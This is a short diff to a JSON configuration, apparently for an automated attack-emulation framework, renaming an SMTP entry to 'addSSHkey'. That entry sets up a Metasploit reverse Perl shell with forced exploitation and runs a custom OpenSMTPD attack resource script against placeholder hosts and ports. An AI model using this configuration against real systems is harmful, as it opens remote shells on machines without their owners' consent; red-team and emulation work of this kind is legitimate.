@@ -13,7 +13,7 @@
         "wait_time": "25",
         "config": ""
       },
-      "smtp_server": {
+      "addSSHkey": {
         "instructions": "back \n set payload cmd/unix/reverse_perl \n set ForceExploit true \n set DB_WORKSPACE . \n set RHOSTS {} \n set LISTENER {} \n set LPORT {LPORT} \n resource /data/attacker/custom_attacks/smtpd/attacco_opensmtpd_mod.rc",
         "attack_type": "ResourceAttack",
         "wait_time": "60",
@@ -60,12 +60,6 @@
       "instructions": "echo no shell attack",
       "attack_type": "NotImplementedAttack",
       "wait_time": "10",
-      "config": ""
-    },
-    "addSSHkey": {
-      "instructions": "echo no addSSHkey attack",
-      "attack_type": "NotImplementedAttack",
-      "wait_time": "1",
       "config": ""
     },
     "remoteShell": {
